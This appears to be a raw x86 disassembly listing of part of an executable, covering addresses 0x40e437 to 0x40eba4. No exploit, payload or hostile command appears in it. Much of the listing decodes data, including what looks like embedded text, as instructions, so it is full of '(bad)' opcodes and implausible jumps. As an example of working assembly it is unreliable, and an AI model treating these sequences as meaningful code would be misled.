  40e437:	add    DWORD PTR [eax],0x0
	...
  40e442:	add    BYTE PTR [eax],al
  40e444:	mov    ebp,0xde82
  40e449:	add    BYTE PTR [eax],al
  40e44b:	add    BYTE PTR [eax],al
  40e44d:	add    BYTE PTR [eax],al
  40e44f:	add    BYTE PTR [ebp+0x45],al
  40e452:	js     0x40e4bf
  40e454:	pop    ecx
  40e455:	in     al,dx
  40e456:	loop   0x40e469
  40e458:	push   0x4ecaa311
  40e45d:	push   ss
  40e45e:	mov    al,ds:0x74fbe7cc
  40e463:	in     eax,0xa1
  40e465:	out    0x35,eax
  40e467:	in     al,0x4b
  40e469:	push   esp
  40e46a:	inc    ebp
  40e46b:	inc    ebp
  40e46c:	xor    BYTE PTR [eax+0x369a71e8],0xd8
  40e473:	in     eax,dx
  40e474:	xchg   ecx,eax
  40e475:	psllq  mm5,QWORD PTR [ecx]
  40e478:	push   ss
  40e479:	mov    dl,0xf
  40e47b:	sbb    eax,0x45f6f09
  40e480:	sbb    eax,0x48ac7c71
  40e485:	and    ch,BYTE PTR [eax]
  40e487:	adc    al,0x4c
  40e489:	inc    ebp
  40e48a:	inc    ebp
  40e48b:	test   DWORD PTR [eax+0x33],0x8fcc4545
  40e492:	in     eax,0x45
  40e494:	int3   
  40e495:	jl     0x40e4fb
  40e497:	pop    esp
  40e498:	or     BYTE PTR [ebx+0xa],al
  40e49b:	into   
  40e49c:	xchg   edi,eax
  40e49d:	mov    ds:0x1ef54b0c,eax
  40e4a2:	icebp  
  40e4a3:	ret    
  40e4a4:	push   esi
  40e4a5:	iret   
  40e4a6:	leave  
  40e4a7:	cmp    DWORD PTR [ebp+ecx*4-0x2f],0xcccc29c2
  40e4af:	int3   
  40e4b0:	jne    0x40e436
  40e4b2:	int3   
  40e4b3:	int3   
  40e4b4:	mov    bh,0x45
  40e4b6:	int3   
  40e4b7:	int3   
  40e4b8:	int3   
  40e4b9:	inc    ebp
  40e4ba:	inc    ebp
  40e4bb:	inc    ebp
  40e4bc:	inc    ebp
  40e4bd:	inc    ebp
  40e4be:	inc    ebp
  40e4bf:	inc    ebp
  40e4c0:	inc    ebp
  40e4c1:	inc    ebp
  40e4c2:	adc    ebx,ecx
  40e4c4:	or     al,0x8e
  40e4c6:	scas   al,BYTE PTR es:[edi]
  40e4c7:	xchg   ebp,eax
  40e4c8:	mov    edx,0xd8ae3623
  40e4cd:	bound  ebp,QWORD PTR [edx-0x80]
  40e4d0:	and    eax,0x87106ae5
  40e4d5:	sti    
  40e4d6:	cld    
  40e4d7:	out    0x3c,eax
  40e4d9:	push   eax
	...
  40e4e2:	jb     0x40e55b
  40e4e4:	jae    0x40e54b
  40e4e6:	popa   
  40e4e7:	jb     0x40e54c
  40e4e9:	and    BYTE PTR cs:[eax+0x65],dh
  40e4ed:	outs   dx,DWORD PTR ds:[esi]
  40e4ee:	arpl   WORD PTR [ebx+0x3e],si
  40e4f1:	inc    ecx
  40e4f2:	arpl   WORD PTR [eax+eiz*1+0x69],sp
  40e4f6:	and    BYTE PTR [edx+0x6c],dh
  40e4f9:	bound  esi,QWORD PTR [ebx+0x43]
  40e4fc:	addr16 jns 0x40e56c
  40e4ff:	cs jae 0x40e572
  40e502:	das    
  40e503:	jae    0x40e579
  40e505:	cmp    ah,BYTE PTR [edx+0x20]
  40e508:	cmp    ch,BYTE PTR [ebp+0x6d]
  40e50b:	je     0x40e56f
  40e50d:	dec    ebp
  40e50e:	or     eax,0x61786d3c
  40e513:	fs jbe 0x40e58f
  40e516:	dec    ebp
  40e517:	je     0x40e582
  40e519:	jae    0x40e53b
  40e51b:	je     0x40e55b
  40e51d:	gs outs dx,DWORD PTR ds:[esi]
  40e520:	arpl   WORD PTR cs:[ebp+0x66],sp
  40e524:	jbe    0x40e573
  40e526:	imul   esp,DWORD PTR [ebx+0x3c],0x41
  40e52a:	gs popa 
  40e52c:	je     0x40e5a1
  40e52e:	and    BYTE PTR [ebp+0x53],ah
  40e531:	jbe    0x40e55c
  40e533:	sub    BYTE PTR [edi+0x41],ch
  40e536:	outs   dx,DWORD PTR ds:[esi]
  40e537:	fs outs dx,DWORD PTR cs:[esi]
  40e53a:	and    BYTE PTR [esi+0x65],dh
  40e53d:	push   edx
  40e53e:	ins    DWORD PTR es:[edi],dx
  40e53f:	ins    DWORD PTR es:[edi],dx
  40e540:	cmp    al,0x73
  40e542:	and    BYTE PTR [eax],ah
  40e544:	jb     0x40e5b9
  40e546:	dec    ebp
  40e547:	and    BYTE PTR cs:[edi+ebp*2+0x52],dh
  40e54c:	gs gs bound esp,QWORD PTR gs:[esi+esi*2+0x79]
  40e553:	or     ah,BYTE PTR [ebx+0x65]
  40e556:	ins    DWORD PTR es:[edi],dx
  40e557:	push   ebx
  40e558:	cmp    eax,0x6d237645
  40e55d:	cmp    ch,BYTE PTR [esi]
  40e55f:	outs   dx,DWORD PTR ds:[esi]
  40e560:	outs   dx,DWORD PTR ds:[esi]
  40e561:	cs push ebx
  40e563:	jb     0x40e565
  40e565:	mov    DWORD PTR [ecx-0x611333d0],ecx
  40e56b:	mov    DWORD PTR [ecx+0x2dc9920f],ecx
  40e571:	add    bh,BYTE PTR [edi+edi*8]
  40e574:	(bad)  
  40e576:	sub    DWORD PTR [eax-0x25a3a492],ecx
  40e57c:	or     BYTE PTR [ebp-0x1d],dl
  40e57f:	int    0x3f
  40e581:	mov    edi,0xa22b6d02
  40e586:	shr    BYTE PTR [ecx+0xf],0x6
  40e58a:	cwde   
  40e58b:	popf   
  40e58c:	(bad)  
  40e58d:	adc    DWORD PTR [edx+0xd8989da],edi
  40e593:	into   
  40e594:	mov    DWORD PTR [ecx-0x76ca3985],ecx
  40e59a:	jmp    DWORD PTR [ecx+0x68]
  40e59d:	cmc    
  40e59e:	xchg   ecx,eax
  40e59f:	stc    
  40e5a0:	jnp    0x40e5a9
  40e5a2:	and    edi,eax
  40e5a4:	fdivr  DWORD PTR ds:0x993953e2
  40e5aa:	adc    BYTE PTR [ecx],dl
  40e5ac:	fist   WORD PTR [ebp+0x6b0ae60b]
  40e5b2:	loop   0x40e5b3
  40e5b4:	(bad)  
  40e5b5:	call   DWORD PTR [eax+ebp*2-0x61]
  40e5b9:	push   es
  40e5ba:	sti    
  40e5bb:	fldenv [ebp-0x20]
  40e5be:	loop   0x40e5f9
  40e5c0:	std    
  40e5c1:	xchg   esi,eax
  40e5c2:	add    ah,BYTE PTR [ebp-0x3f]
  40e5c5:	(bad)  
  40e5c6:	std    
  40e5c7:	pop    es
  40e5c8:	test   DWORD PTR [ecx+ecx*1+0x55cd6f97],0x9a33998f
  40e5d3:	(bad)  
  40e5d4:	jmp    DWORD PTR [ebp+eax*1+0x33]
  40e5d8:	(bad)  
  40e5d9:	(bad)  
  40e5da:	dec    DWORD PTR [eax]
  40e5dc:	or     BYTE PTR [eax],cl
  40e5de:	or     BYTE PTR [eax],cl
  40e5e0:	or     BYTE PTR [eax],cl
  40e5e2:	or     BYTE PTR [eax],cl
  40e5e4:	int    0x3d
  40e5e6:	add    BYTE PTR [eax],0x0
  40e5e9:	add    BYTE PTR [eax],al
  40e5eb:	add    BYTE PTR [eax],al
  40e5ed:	add    BYTE PTR [eax],al
  40e5ef:	add    BYTE PTR [ebp+0x75],dh
  40e5f2:	popa   
  40e5f3:	pop    ax
  40e5f5:	and    eax,0x35ffc5e4
  40e5fa:	add    al,0x28
  40e5fc:	lock cs cli 
  40e5ff:	mov    dh,al
  40e601:	jno    0x40e598
  40e603:	rol    dl,0x42
  40e606:	jb     0x40e5d4
  40e608:	push   ebp
  40e609:	xor    al,0x75
  40e60b:	jne    0x40e5ca
  40e60d:	adc    al,0x75
  40e60f:	jne    0x40e5d8
  40e611:	push   ds
  40e612:	jne    0x40e689
  40e614:	push   ecx
  40e615:	repnz xor BYTE PTR [ebx-0x6c],bh
  40e619:	pop    edi
  40e61a:	adc    cl,bl
  40e61c:	fbld   TBYTE PTR [edi]
  40e61e:	lock sub al,0x3e
  40e621:	jo     0x40e669
  40e623:	jmp    0x40e64b
  40e625:	daa    
  40e626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e627:	dec    eax
  40e628:	outs   dx,BYTE PTR ds:[esi]
  40e629:	jle    0x40e68e
  40e62b:	mov    ds:0x95540075,al
  40e630:	and    esp,ecx
  40e632:	add    BYTE PTR [eax],al
  40e634:	add    BYTE PTR [edi-0x4244bc62],ah
  40e63a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e63b:	adc    edi,edi
  40e63d:	sbb    eax,DWORD PTR [ebx]
  40e63f:	ss mov ah,0xd5
  40e642:	rcr    ebp,1
  40e644:	mov    eax,ds:0x92f60f2a
  40e649:	jmp    0x2b13:0x9877f82a
  40e650:	ret    
  40e651:	jmp    0xf4c9bec0
  40e656:	dec    ebx
  40e657:	push   esi
  40e658:	add    BYTE PTR [eax],al
  40e65a:	and    eax,esp
  40e65c:	add    BYTE PTR [eax],al
  40e65e:	add    bh,bh
  40e660:	(bad)  
  40e661:	(bad)  
  40e662:	(bad)  
  40e663:	(bad)  
  40e664:	(bad)  
  40e665:	(bad)  
  40e666:	(bad)  
  40e667:	call   DWORD PTR ds:0xd1af
  40e66d:	add    BYTE PTR [eax],al
  40e66f:	add    BYTE PTR [eax],al
  40e671:	add    BYTE PTR [eax],al
  40e673:	add    BYTE PTR [edx+0x6a],ch
  40e676:	xchg   ebp,eax
  40e677:	and    al,0xb9
  40e679:	je     0x40e65c
  40e67b:	or     ebx,edx
  40e67d:	aaa    
  40e67e:	stos   DWORD PTR es:[edi],eax
  40e67f:	sbb    eax,0x660032dc
  40e684:	dec    eax
  40e685:	std    
  40e686:	jbe    0x40e696
  40e688:	pusha  
  40e689:	aad    0xa5
  40e68b:	enter  0x5539,0x6a
  40e68f:	push   0x4
  40e691:	fsub   QWORD PTR [eax-0xa99502b]
  40e697:	mov    ch,0x2
  40e699:	sub    dh,BYTE PTR [esi-0x4291b78c]
  40e69f:	xchg   ecx,eax
  40e6a0:	test   eax,0x96baebe4
  40e6a5:	mov    ds,WORD PTR [esi+ebx*2-0x49]
  40e6a9:	adc    DWORD PTR [ecx],edi
  40e6ab:	xchg   esp,eax
  40e6ac:	cmp    BYTE PTR [edx+0x6a],ch
  40e6af:	pop    esp
  40e6b0:	pop    esi
  40e6b1:	(bad)  [edx+0x6a]
  40e6b4:	fstp   DWORD PTR [eax]
  40e6b6:	jecxz  0x40e722
  40e6b8:	add    bl,bh
  40e6ba:	ds call 0x7640d2bf
  40e6c0:	test   DWORD PTR [edi-0x196f438a],0x9bf723ea
  40e6ca:	xchg   esi,eax
  40e6cb:	inc    eax
  40e6cc:	dec    ebp
  40e6cd:	(bad)  
  40e6ce:	adc    al,0x99
  40e6d0:	data16 add BYTE PTR [eax],al
  40e6d3:	add    BYTE PTR [ebx],bh
  40e6d5:	in     eax,0x0
  40e6d7:	add    BYTE PTR [esi+0xf2],bl
  40e6dd:	mov    ecx,DWORD PTR [ebx-0x74747475]
  40e6e3:	mov    ecx,DWORD PTR [ebx-0x483d0c75]
  40e6e9:	pop    edi
  40e6ea:	adc    eax,0x62477249
  40e6ef:	pop    ebx
  40e6f0:	shl    DWORD PTR [ebp+0x794d6b0],0x2a
  40e6f7:	jg     0x40e6ed
  40e6f9:	add    eax,ecx
  40e6fb:	push   ebp
  40e6fc:	xlat   BYTE PTR ds:[ebx]
  40e6fd:	jmp    0x40e702
  40e702:	add    BYTE PTR [eax],al
  40e704:	add    BYTE PTR [eax],al
  40e706:	add    BYTE PTR [eax],al
  40e708:	add    BYTE PTR [ecx+0x22],dh
  40e70b:	or     BYTE PTR [eax+eax*1],dl
  40e70e:	add    BYTE PTR [ecx+0x31],al
  40e711:	ret    0x804c
  40e714:	mov    ebx,0xb665b052
  40e719:	stos   DWORD PTR es:[edi],eax
  40e71a:	mov    ebp,0x1d137124
  40e71f:	fist   DWORD PTR [esi+0x5785a2f5]
  40e725:	xor    eax,0x3096b008
  40e72a:	test   eax,0x239edd3e
  40e72f:	(bad)  
  40e730:	mov    ecx,0x1d0000d8
  40e735:	cmp    eax,DWORD PTR [eax]
  40e737:	add    BYTE PTR [edi-0xff7d25],al
  40e73d:	add    al,0x8f
  40e73f:	mov    cl,0xe6
  40e741:	sub    eax,0x69191f0d
  40e746:	xlat   BYTE PTR ds:[ebx]
  40e747:	les    edx,FWORD PTR [esi+0x36]
  40e74a:	xor    edx,DWORD PTR [ecx-0x6ce3d361]
  40e750:	jmp    0x9bf90f24
  40e755:	(bad)  
  40e756:	(bad)  
  40e757:	dec    DWORD PTR [ebp+0x3fbd2329]
  40e75d:	mov    edx,0xcaed0f2a
  40e762:	int    0xc4
  40e764:	pop    ebp
  40e765:	jp     0x40e6f2
  40e767:	push   edi
  40e768:	push   cs
  40e769:	mov    ds:0xd7e8283b,al
  40e76e:	jecxz  0x40e721
  40e770:	in     al,dx
  40e771:	and    BYTE PTR [ecx+0x69],ch
  40e774:	xchg   ecx,eax
  40e775:	(bad)  
  40e776:	call   FWORD PTR [edx+eiz*4-0xa4]
  40e77d:	(bad)  
  40e77e:	(bad)  
  40e77f:	(bad)  
  40e780:	(bad)  
  40e781:	(bad)  
  40e782:	(bad)  
  40e783:	(bad)  
  40e784:	(bad)  
  40e785:	call   DWORD PTR [ecx-0x29]
  40e788:	iret   
  40e789:	lea    ecx,[ebp-0x72727273]
  40e78f:	lea    ecx,[ebp+0x7e00008d]
  40e795:	xchg   edi,eax
  40e796:	in     eax,0x7c
  40e798:	js     0x40e78c
  40e79a:	int    0xac
  40e79c:	adc    ch,BYTE PTR [edi-0x4b7652ad]
  40e7a2:	test   BYTE PTR ds:0xd2170ecd,0xf6
  40e7a9:	cwde   
  40e7aa:	mov    WORD PTR [ebx+0x0],ds
  40e7ad:	add    BYTE PTR [eax],dh
  40e7af:	xor    eax,DWORD PTR [eax]
  40e7b1:	add    BYTE PTR [ecx+0x3c00003a],ch
  40e7b7:	or     al,0x3a
  40e7b9:	push   esi
  40e7ba:	scas   al,BYTE PTR es:[edi]
  40e7bb:	ret    
  40e7bc:	sbb    ebx,DWORD PTR [eax-0x78f2837c]
  40e7c2:	(bad)  
  40e7c3:	scas   al,BYTE PTR es:[edi]
  40e7c4:	lods   eax,DWORD PTR ds:[esi]
  40e7c5:	jmp    0x40e831
  40e7c7:	jge    0x40e7a4
  40e7c9:	mov    eax,0xd6aa191
  40e7ce:	add    BYTE PTR [ecx+ebx*2],ah
  40e7d1:	push   0x34
  40e7d3:	pop    ss
  40e7d4:	and    al,0x24
  40e7d6:	and    al,0xc2
  40e7d8:	xor    eax,0x5c6270ad
  40e7dd:	and    ebx,DWORD PTR [edi+0x67b37256]
  40e7e3:	jb     0x40e774
  40e7e5:	push   0x123a2ca3
  40e7ea:	dec    ebp
  40e7eb:	mov    dh,0xb9
  40e7ed:	retf   
  40e7ee:	mov    al,0x8b
  40e7f0:	push   ss
  40e7f1:	psadbw mm3,QWORD PTR [ebx-0x35]
  40e7f5:	mov    al,0xe1
  40e7f7:	lock add eax,0xb6242499
  40e7fd:	sti    
  40e7fe:	and    al,0x24
  40e800:	and    al,0xff
  40e802:	(bad)  
  40e803:	(bad)  
  40e804:	(bad)  
  40e805:	(bad)  
  40e806:	(bad)  
  40e807:	(bad)  
  40e808:	(bad)  
  40e809:	call   FWORD PTR [edx]
  40e80b:	or     ch,dh
	...
  40e815:	add    bh,bh
  40e817:	call   FWORD PTR [eax]
  40e819:	inc    ebx
  40e81a:	(bad)  
  40e81c:	fisttp WORD PTR cs:[ecx]
  40e81f:	jno    0x40e835
  40e821:	(bad)  
  40e823:	clc    
  40e824:	push   0x66
  40e826:	mov    ds:0x873f9848,eax
  40e82b:	jmp    0x12da1eb1
  40e830:	(bad)  
  40e831:	(bad)  
  40e832:	mov    esi,0xa67949e2
  40e837:	push   0xb5e31543
  40e83c:	(bad)  
  40e83d:	cld    
  40e83e:	lock mov eax,0x25883091
  40e844:	mov    al,BYTE PTR [eax]
  40e846:	out    0xad,al
  40e848:	arpl   WORD PTR [edi+0x33],dx
  40e84b:	mov    BYTE PTR [eax-0x4759],bh
  40e851:	xchg   ebp,eax
  40e852:	rcr    BYTE PTR [edx-0x153f0001],cl
  40e858:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e859:	inc    eax
  40e85b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e85c:	clc    
  40e85d:	jnp    0x40e7e0
  40e85f:	out    dx,eax
  40e860:	mov    esi,0xc3a1e794
  40e865:	rcl    bh,1
  40e867:	inc    ecx
  40e868:	sub    BYTE PTR [eax+0x44],ch
  40e86b:	shl    DWORD PTR [eax+ecx*8-0x25e9f7c],0x35
  40e873:	rol    al,0xc0
  40e876:	jge    0x40e856
  40e878:	rol    al,0xa2
  40e87b:	jae    0x40e83d
  40e87d:	rol    al,0x0
	...
  40e888:	retf   
  40e889:	es pop edi
  40e88b:	mov    ds:0x83c874fe,eax
  40e890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e891:	data16 (bad) [eax+edx*2-0x33]
  40e896:	pop    ebx
  40e897:	mov    esp,0xd45f1e2
  40e89c:	sbb    DWORD PTR [eax+0xebec],ecx
  40e8a2:	add    BYTE PTR [eax],al
  40e8a4:	add    BYTE PTR [eax],al
  40e8a6:	add    BYTE PTR [eax],al
  40e8a8:	add    BYTE PTR [ebx-0x3cc90275],cl
  40e8ae:	int3   
  40e8af:	mov    ecx,DWORD PTR [ebx+0x1e40fdd2]
  40e8b5:	(bad)  
  40e8b6:	mov    dh,0xcc
  40e8b8:	push   0xc3f8059f
  40e8bd:	imul   edx,eax,0xc1adefbc
  40e8c3:	(bad)  
  40e8c4:	repnz or ebp,DWORD PTR [edx-0x3c]
  40e8c8:	in     eax,dx
  40e8c9:	ja     0x40e8e2
  40e8cb:	icebp  
  40e8cc:	and    DWORD PTR [ebx-0x70767912],edx
  40e8d2:	xchg   ebx,eax
  40e8d3:	stc    
  40e8d4:	mov    ecx,DWORD PTR [ebx-0x74742e4d]
  40e8da:	or     DWORD PTR [ecx+0x1f],ecx
  40e8dd:	mov    edi,edi
  40e8df:	pop    es
  40e8e0:	pop    es
  40e8e1:	and    bl,BYTE PTR [ebx+edx*2+0x47]
  40e8e5:	jmp    0x40e895
  40e8e7:	test   bh,bl
  40e8e9:	fdivr  DWORD PTR [eax]
  40e8eb:	adc    al,0x83
  40e8ed:	fcmove st,st(0)
  40e8ef:	inc    edx
  40e8f0:	xchg   ebp,eax
  40e8f1:	cmp    al,0xe9
  40e8f3:	or     al,0xc2
  40e8f5:	mov    DWORD PTR [ecx-0x1],edi
  40e8f8:	(bad)  
  40e8f9:	call   edi
  40e8fb:	push   eax
  40e8fc:	xor    eax,0xc33a8960
  40e901:	(bad)  
  40e902:	sbb    eax,0x5a997903
  40e907:	add    BYTE PTR [eax+0x55],0xcf
  40e90b:	lds    edi,FWORD PTR [esi]
  40e90d:	ds push edi
  40e90f:	aad    0xc5
  40e911:	test   eax,0x474e0f11
  40e916:	sbb    edi,edi
  40e918:	inc    ecx
  40e91a:	pop    edx
  40e91b:	push   ds
  40e91c:	(bad)  
  40e91d:	(bad)  
  40e91e:	inc    DWORD PTR [eax]
	...
  40e928:	inc    esp
  40e929:	icebp  
  40e92a:	mov    bh,bh
  40e92c:	(bad)  
  40e92d:	call   DWORD PTR [ebx+0x69]
  40e930:	outs   dx,BYTE PTR ds:[esi]
  40e931:	and    BYTE PTR [edx+0x73],dh
  40e934:	jbe    0x40e9aa
  40e936:	inc    ebx
  40e937:	and    BYTE PTR ds:0x44287865,bh
  40e93d:	push   esp
  40e93e:	jo     0x40e9b3
  40e940:	popa   
  40e941:	and    BYTE PTR [ecx+0x61],ch
  40e944:	arpl   WORD PTR cs:[esi],di
  40e947:	imul   esi,DWORD PTR [edx+0x65],0x6d747465
  40e94e:	inc    esi
  40e94f:	bound  edi,QWORD PTR [esi]
  40e951:	ins    BYTE PTR es:[edi],dx
  40e952:	cmp    eax,0x6c72616f
  40e957:	jo     0x40e997
  40e959:	or     dh,BYTE PTR [edx+0x6f]
  40e95c:	or     cl,BYTE PTR [edx]
  40e95e:	dec    bp
  40e960:	ins    DWORD PTR es:[edi],dx
  40e961:	js     0x40e9c8
  40e963:	cmp    al,0x74
  40e965:	jae    0x40e9db
  40e967:	outs   dx,BYTE PTR ds:[esi]
  40e968:	ins    DWORD PTR es:[edi],dx
  40e969:	je     0x40e978
  40e96b:	jb     0x40e97a
  40e96d:	ds jae 0x40e9bd
  40e970:	jne    0x40e9a0
  40e972:	and    BYTE PTR [ecx+0x6d],al
  40e975:	jns    0x40e9dc
  40e977:	cs jb  0x40e9e0
  40e97a:	gs cmp al,0xd
  40e97d:	jo     0x40e9f1
  40e97f:	cs jb  0x40e9a2
  40e982:	outs   dx,DWORD PTR gs:[esi]
  40e984:	jb     0x40e9ed
  40e986:	or     dh,BYTE PTR [edx+0x70]
  40e989:	gs je  0x40ea00
  40e98c:	and    BYTE PTR [eax+0x62],ch
  40e98f:	inc    ecx
  40e990:	and    BYTE PTR [edx],ah
  40e992:	je     0x40ea08
  40e994:	je     0x40ea06
  40e996:	ds inc esp
  40e998:	ins    BYTE PTR es:[edi],dx
  40e999:	ins    BYTE PTR es:[edi],dx
  40e99a:	sub    BYTE PTR [edx+esi*2+0x65],ch
  40e99e:	outs   dx,BYTE PTR ds:[esi]
  40e99f:	cmp    al,0x69
  40e9a1:	gs ins DWORD PTR es:[edi],dx
  40e9a3:	das    
  40e9a4:	gs jb  0x40e9c9
  40e9a7:	outs   dx,BYTE PTR cs:[esi]
  40e9a9:	imul   edi,edi,0xffffffff
  40e9af:	inc    DWORD PTR [eax]
  40e9b1:	add    BYTE PTR [ecx-0x33],bl
  40e9b4:	out    0xf5,al
  40e9b6:	retf   
  40e9b7:	cmp    BYTE PTR [ecx],cl
  40e9b9:	xchg   esi,eax
  40e9ba:	or     BYTE PTR [edi+0x6c],al
  40e9bd:	mov    sp,0xc125
  40e9c1:	pop    edi
  40e9c2:	xchg   bl,dh
  40e9c4:	(bad)
  40e9c8:	sti    
  40e9c9:	push   ecx
  40e9ca:	add    BYTE PTR [eax],al
  40e9cc:	push   es
  40e9cd:	cmp    DWORD PTR [eax],eax
  40e9cf:	add    BYTE PTR [esi+0x23],dl
  40e9d2:	add    BYTE PTR [eax],al
  40e9d4:	div    ch
  40e9d6:	or     cl,BYTE PTR [esi-0x25de5254]
  40e9dc:	in     eax,dx
  40e9dd:	test   DWORD PTR [esi+0x37],ebx
  40e9e0:	aas    
  40e9e1:	pop    es
  40e9e2:	mov    ds:0xfdea67ae,al
  40e9e7:	xor    eax,0xdaf7b457
  40e9ec:	add    BYTE PTR [eax],al
  40e9ee:	ss icebp 
  40e9f0:	cmp    al,0x1c
  40e9f2:	add    BYTE PTR [eax],al
  40e9f4:	add    BYTE PTR [esi+0x3cf633ab],cl
  40e9fa:	mov    cl,0x3d
  40e9fc:	or     cl,BYTE PTR [eax-0x64223c88]
  40ea02:	mov    cl,0x22
  40ea04:	push   edx
  40ea05:	lds    ebp,FWORD PTR [edx+0x19]
  40ea08:	jmp    0x40ea74
  40ea0a:	arpl   WORD PTR [edi],bx
  40ea0c:	mov    bh,0x75
  40ea0e:	xor    DWORD PTR [esi],eax
  40ea10:	push   esp
  40ea11:	popf   
  40ea12:	sti    
  40ea13:	xor    esp,DWORD PTR [ecx+0xf780cd]
  40ea19:	add    BYTE PTR [esi+0x57],al
	...
  40ea27:	add    BYTE PTR [ebx+0x2],dl
  40ea2a:	(bad)  
	...
  40ea33:	add    BYTE PTR [eax],al
  40ea35:	add    BYTE PTR [edi-0x669ee834],al
  40ea3b:	popf   
  40ea3c:	mov    al,0xa2
  40ea3e:	fisttp DWORD PTR [esi]
  40ea40:	and    al,0xb0
  40ea42:	das    
  40ea43:	inc    esi
  40ea44:	mov    bl,0xf9
  40ea46:	inc    ebx
  40ea47:	aaa    
  40ea48:	pop    edi
  40ea49:	or     al,0x3e
  40ea4b:	mov    cl,cl
  40ea4d:	call   0x8264ea52
  40ea52:	out    0x20,al
  40ea54:	in     al,dx
  40ea55:	cmp    DWORD PTR [esi+0x4d],ebp
  40ea58:	jae    0x40ea02
  40ea5a:	mov    dh,0xb8
  40ea5c:	cdq    
  40ea5d:	js     0x40eab7
  40ea5f:	xor    bl,BYTE PTR [ecx+0x6f1d5de9]
  40ea65:	(bad)  
  40ea66:	int3   
  40ea67:	out    0xac,al
  40ea69:	in     al,dx
  40ea6a:	mov    ebp,esp
  40ea6c:	inc    eax
  40ea6d:	add    BYTE PTR [eax],al
  40ea6f:	sub    bl,BYTE PTR [eax+0x22]
  40ea72:	add    BYTE PTR [eax],al
  40ea74:	scas   eax,DWORD PTR es:[edi]
  40ea75:	inc    ebx
  40ea76:	scas   eax,DWORD PTR es:[edi]
  40ea77:	add    BYTE PTR [eax-0x38],dl
  40ea7a:	outs   dx,DWORD PTR ds:[esi]
  40ea7b:	jbe    0x40ea8e
  40ea7d:	ret    
  40ea7e:	mov    ds:0x5d5a7249,al
  40ea83:	ja     0x40ea10
  40ea85:	mov    ebx,0x434b8d30
  40ea8a:	push   ss
  40ea8b:	fst    DWORD PTR [esi]
  40ea8d:	cmp    bh,BYTE PTR [ebp+0x505072b5]
  40ea93:	push   eax
  40ea94:	sar    bl,0x50
  40ea97:	push   eax
  40ea98:	add    ecx,ebp
  40ea9a:	push   eax
  40ea9b:	push   eax
  40ea9c:	push   eax
  40ea9d:	call   0xe929d38a
  40eaa2:	call   0xc729d38f
  40eaa7:	push   esi
  40eaa8:	cmc    
  40eaa9:	and    al,0xe7
  40eaab:	rcr    DWORD PTR [edi],0x97
  40eaae:	dec    esp
  40eaaf:	scas   al,BYTE PTR es:[edi]
  40eab0:	shl    ebx,cl
  40eab2:	test   BYTE PTR [ebp-0x79],dl
  40eab5:	mov    bh,ch
  40eab7:	inc    esi
  40eab8:	nop
  40eab9:	rcr    BYTE PTR [edx-0x45],0x1d
  40eabd:	pop    ecx
	...
  40eac6:	add    BYTE PTR [eax],al
  40eac8:	add    BYTE PTR [esp+ebx*2+0xfbf7],dl
  40eacf:	sbb    BYTE PTR [eax],dl
  40ead1:	mov    cl,0x50
  40ead3:	mov    bh,al
  40ead5:	js     0x40ead9
  40ead7:	and    ah,dh
  40ead9:	sbb    eax,0x36e9cd8f
  40eade:	cmp    eax,0xec42a886
  40eae3:	mov    ds:0x83f667fc,eax
  40eae8:	xchg   ecx,eax
  40eae9:	in     al,0x6c
  40eaeb:	retf   
  40eaec:	and    edx,DWORD PTR [ecx-0x3821a06b]
  40eaf2:	add    BYTE PTR [eax],al
  40eaf4:	push   ecx
  40eaf5:	out    0x0,eax
  40eaf7:	add    dl,ah
  40eaf9:	sbb    esi,ecx
  40eafb:	add    BYTE PTR [eax],al
  40eafd:	dec    esi
  40eafe:	xor    DWORD PTR [ecx],ecx
  40eb00:	jnp    0x40eb23
  40eb02:	fs scas eax,DWORD PTR es:[edi]
  40eb04:	out    0x87,al
  40eb06:	retf   
  40eb07:	enter  0x74c,0x1b
  40eb0b:	add    BYTE PTR [edi],0xb
  40eb0e:	add    ebx,ebx
  40eb10:	es (bad) 
  40eb12:	cmp    esi,DWORD PTR [esi+0xf2]
  40eb18:	dec    ebp
  40eb19:	cmp    ebx,ebp
  40eb1b:	xchg   esp,eax
  40eb1c:	and    al,bl
  40eb1e:	mov    edx,0x2afacb17
  40eb23:	leave  
  40eb24:	cwde   
  40eb25:	aam    0xa7
  40eb27:	and    DWORD PTR [eax-0x5d9b1c4b],0xb1baba7d
  40eb31:	nop
  40eb32:	fwait
  40eb33:	stos   DWORD PTR es:[edi],eax
  40eb34:	fild   DWORD PTR [eax]
  40eb36:	add    cl,ch
  40eb38:	ins    DWORD PTR es:[edi],dx
  40eb39:	xchg   ecx,eax
  40eb3a:	add    BYTE PTR [eax],al
  40eb3c:	add    BYTE PTR [eax+0x50],dl
  40eb3f:	push   eax
  40eb40:	push   eax
  40eb41:	push   eax
  40eb42:	push   eax
  40eb43:	push   eax
  40eb44:	push   eax
  40eb45:	push   eax
  40eb46:	mov    ah,0x39
  40eb48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  40eb51:	add    BYTE PTR [eax],al
  40eb53:	add    BYTE PTR [esi],ch
  40eb55:	(bad)  
  40eb56:	scas   al,BYTE PTR es:[edi]
  40eb57:	mov    WORD PTR [ecx+0x7d],ds
  40eb5a:	pop    eax
  40eb5b:	and    edx,DWORD PTR [edx-0x76]
  40eb5e:	pop    edx
  40eb5f:	xchg   BYTE PTR [esi+ecx*1-0xb],bh
  40eb63:	cmp    ah,BYTE PTR [eax+0x1a272d8e]
  40eb69:	pop    ebx
  40eb6a:	rol    BYTE PTR [edx-0x29490000],0x0
  40eb71:	add    bh,ah
  40eb73:	fiadd  DWORD PTR [eax]
  40eb75:	add    BYTE PTR [edi],dl
  40eb77:	adc    eax,0x8cb8ec6d
  40eb7c:	pop    ds
  40eb7d:	jl     0x40eb6b
  40eb7f:	hlt    
  40eb80:	lea    edi,[edi-0x10189328]
  40eb86:	pop    esp
  40eb87:	mov    esp,0xd6ace33c
  40eb8c:	imul   esp,edx,0x0
  40eb8f:	add    bh,bh
  40eb91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb92:	loop   0x40eb32
  40eb94:	add    BYTE PTR [eax],al
  40eb96:	add    ch,ch
  40eb98:	pop    DWORD PTR ss:[edx]
  40eb9b:	sbb    DWORD PTR [edx+esi*2],edi
  40eb9e:	dec    eax
  40eb9f:	mov    al,ds:0x4bef034d
  40eba4:	mov    ds:0x792c786c,eax
